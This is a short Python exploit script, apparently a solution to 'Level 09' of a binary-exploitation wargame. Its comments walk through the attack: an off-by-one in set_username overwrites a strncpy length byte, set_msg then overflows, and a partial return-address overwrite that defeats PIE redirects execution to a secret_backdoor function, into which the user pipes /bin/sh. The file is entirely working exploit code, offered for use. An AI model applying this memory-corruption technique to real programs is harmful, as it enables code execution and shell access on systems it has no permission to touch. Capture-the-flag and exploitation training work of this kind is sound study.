#!/usr/bin/python

# Exploit for Level 09
# 1. Overwrite strncpy length (byte 180) with 0xca (202) via set_username off-by-one.
# 2. Overwrite return address (offset 200) with 0x488c (partial overwrite) via set_msg buffer overflow.
# 3. Send /bin/sh command to be executed by secret_backdoor.

# Username payload: 40 bytes padding + 0xca (202)
# This sets the length for the next strncpy to 202.
username_payload = "A" * 40 + "\xca"

# Message payload: 200 bytes padding + \x8c\x48 (0x488c)
# This overwrites the return address to point to secret_backdoor (0x...488c).
# The print statement adds a newline, making it exactly 202 bytes total.
# strncpy copies exactly 202 bytes and does NOT pad with nulls,
# preserving the top bytes of the randomized return address (PIE).
msg_payload = "B" * 200 + "\x8c\x48"

print username_payload
print msg_payload

# The exploit expects the user to type the command (e.g., /bin/sh) after running this script.
# Usage: (python exploit.py; cat) | ./level09
